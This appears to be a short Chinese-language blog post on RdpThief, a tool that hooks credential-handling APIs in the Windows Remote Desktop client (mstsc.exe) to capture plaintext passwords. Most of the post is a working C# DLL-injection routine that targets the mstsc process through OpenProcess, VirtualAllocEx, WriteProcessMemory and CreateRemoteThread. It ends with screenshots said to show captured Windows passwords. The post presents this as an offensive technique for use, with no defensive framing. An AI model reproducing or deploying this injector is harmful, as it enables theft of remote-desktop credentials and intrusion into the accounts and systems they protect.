---
layout: post
title: Sharp Rdpthief

---

## 0x01

键盘记录程序通常用于捕获明文凭证。但是，很难用通用的键盘记录程序隔离密码，而且冗长的会话可能导致非常详细的输出，很难解析。

然后就有了rdp thief，通过API Hooking 从 mstsc.exe 中提取明文密码。

[https://github.com/0x09AL/RdpThief](https://github.com/0x09AL/RdpThief)

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210924110524.png)

## 0x02

利用原理利用 API  HOOK相关 API 处理完 mstsc 中输入 的明文凭据后，将其窃取。 MDSec 发现负责处理用户名，密码和域 的 API 分 别 为CredIsMarshaledCredentialW,CryptProtectMemory 和SspiPrepareForCredRead。

RDPthief要在用户输入账号密码前先把dll注入到mstsc进程中，找一个sharp dll注入模板

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210924113616.png)

注入的进程名称改为mstsc

```c#
Process[] expProc = Process.GetProcessesByName("mstsc");
```

更改之后的代码如下

```c#
    static void Main(string[] args)
    {
        String dir =
       Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = "C:\\Windows\\Temp\\RdpThief.dll";
        Process[] mstscProc = Process.GetProcessesByName("mstsc");
        int pid = mstscProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr,
       Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
       "LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
       addr, 0, IntPtr.Zero);
    }
```

## 0x03

成功捕获windows密码

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210924114935.png)

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210924114857.png)

